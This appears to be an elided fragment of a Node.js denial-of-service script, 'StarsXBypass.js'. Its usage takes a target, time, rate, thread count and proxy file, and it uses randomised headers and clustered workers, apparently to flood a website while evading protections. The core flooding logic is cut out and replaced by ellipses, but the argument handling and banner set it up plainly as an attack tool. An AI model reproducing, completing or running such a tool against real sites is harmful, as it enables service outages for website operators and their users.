const net = require("net");
 ...
 if (process.argv.length < 7){
	 console.log(`Usage: node StarsXBypass.js target time rate thread proxy.txt`)
	 process.exit();}
 const headers = {};
...
let randomHeaders = headerGenerator.getHeaders();
 ...
 if (cluster.isMaster){
    ...
    console.log(`[==============================================]`)
    console.log('\x1b[38;2;255;0;0m' + `Target:` + process.argv[2])
    console.log('\x1b[38;2;255;0;0m' + `Time:` + process.argv[3])
    console.log('\x1b[38;2;255;0;0m' +`Rate:`+ process.argv[4])
     console.log('\x1b[38;2;255;0;0m' + `Threads:` + process.argv[5])
    console.log(`[==============================================]`)
    setTimeout(() => {
    }, process.argv[5] * 1000);
